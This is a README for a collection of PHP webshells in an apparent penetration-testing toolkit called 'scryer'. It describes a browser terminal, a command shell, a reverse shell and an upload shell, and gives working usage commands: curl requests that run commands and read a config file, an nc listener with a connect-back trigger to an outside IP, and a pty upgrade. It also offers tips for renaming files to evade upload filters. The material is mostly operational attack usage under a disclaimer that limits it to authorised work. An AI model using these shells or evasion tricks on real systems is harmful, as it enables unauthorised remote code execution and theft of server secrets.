# scryer webshells

Ready-to-drop PHP payloads for the moment you get a file-write / upload
primitive on a box. **Authorised engagements, CTF, and your own labs only** —
the same rule as the rest of scryer.

| File | What it gives you |
|------|-------------------|
| [terminal.php](terminal.php) | A full **interactive terminal in the browser** — tracks the working directory, handles `cd`, arrow-key history. Browse to `http://target/terminal.php`. |
| [cmd.php](cmd.php) | One-shot command shell: `http://target/cmd.php?c=id`. Smallest footprint; great for automation. |
| [reverse-shell.php](reverse-shell.php) | Connect-back shell. Set `LHOST`/`LPORT` (or pass `?lhost=&lport=`), start a listener, browse to it. |
| [upload.php](upload.php) | Upload form + command bar for staging more tooling (linpeas, a static binary, another shell). |

## Typical use
```bash
# 1) get the file onto the target (upload form, S3 bucket, writable share, LFI->log, etc.)
#    scryer's S3 chain can drop cmd.php for you automatically (--exploit).

# 2) command shell (fast triage)
curl 'http://target/cmd.php?c=id'
curl 'http://target/cmd.php?c=cat+/var/www/html/config.php'

# 3) full terminal — just open it in a browser
xdg-open http://target/terminal.php

# 4) interactive shell back to you
rlwrap nc -lvnp 443
#    edit LHOST/LPORT in reverse-shell.php, then:
curl 'http://target/reverse-shell.php?lhost=10.10.14.5&lport=443'
#    upgrade the dumb shell:  python3 -c 'import pty;pty.spawn("/bin/bash")'  (see ../notes/reverse-shells.md)
```

## Notes
- `terminal.php`/`cmd.php` try multiple exec primitives (`proc_open`,
  `shell_exec`, `exec`, `system`, `passthru`, `popen`) so they still work when
  some are disabled in `php.ini`. If **all** are disabled, use a non-exec
  technique (SQLi `INTO OUTFILE`, LFI, deserialization) — see `../notes/`.
- The `SCRYER:` marker in `cmd.php`/`upload.php` output is just a grep anchor;
  strip it if you want a clean response.
- Rename the file per engagement (`x.php`, `.jpg.php`, `shell.phtml`) to dodge
  trivial filters; the upload-bypass tricks are in `../notes/web-recon.md`.
- These are standard, well-known payloads (pentestmonkey / p0wny-style) — kept
  here so you're not hunting for them mid-box, not to evade detection.
```
```
